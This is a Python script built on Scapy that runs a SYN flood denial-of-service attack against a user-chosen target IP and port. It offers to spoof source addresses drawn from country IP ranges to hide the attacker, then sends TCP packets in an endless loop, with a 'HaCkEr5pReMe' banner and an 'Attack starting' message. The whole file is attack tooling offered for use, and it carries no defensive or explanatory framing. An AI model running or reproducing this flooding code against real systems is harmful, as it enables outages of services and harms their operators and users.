#!/usr/bin/env python


from scapy.all import *	
import socket
from userinputs_synflood import *
from Ipchanging_synflood import *
from definepacket_synflood import *
import os
import random

hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
supcountries = supcountries()
destination = definetarget()
targetport = defineporttarget()
awnser_anonymizing = anonymizing_input(supcountries)




if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
   useriprange = chooseiprange(awnser_anonymizing, supcountries)
   Ip_range = ipRange(useriprange)
   
if awnser_anonymizing == yourIP:
   Ip_range = '192.168.0.2'
   Ip_packet = setpacketinfoip(Ip_range,destination)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'
   while 0 == 0:
         Tcp_packet = setpacketinfotcp(targetport)
         send(Ip_packet/TCP())
        
         

if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
    Ip_range = awnser_anonymizing
    ipinfopacket = setpacketinfoip(Ip_range,destination)
    Ip_packet = setpacketinfoip(Ip_range,destination)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    while 0 == 0:
         Tcp_packet = setpacketinfotcp(targetport)
         send(Ip_packet/TCP())



